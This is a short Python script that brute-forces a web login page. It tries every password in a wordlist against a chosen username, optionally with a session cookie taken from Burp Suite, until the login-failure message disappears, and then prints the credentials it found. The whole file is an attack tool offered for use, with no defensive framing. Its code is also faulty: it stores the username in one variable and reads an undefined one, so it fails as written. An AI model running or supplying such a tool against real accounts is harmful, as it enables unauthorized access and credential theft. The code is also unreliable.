
import requests
from termcolor import colored

url = input('[+] Enter Page URL: ')
usr = input('[+] Enter Username For The Account To Bruteforce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ') #the message that is displayed upon failed login on the login page
cookie_value = input('Enter Cookie Value(Optional): ') #session cookie can be obtained from burpsuite


def cracking(usr,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value}) #Make sure to rename all the keys with the names of the form buttons in the webpage
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()




with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')


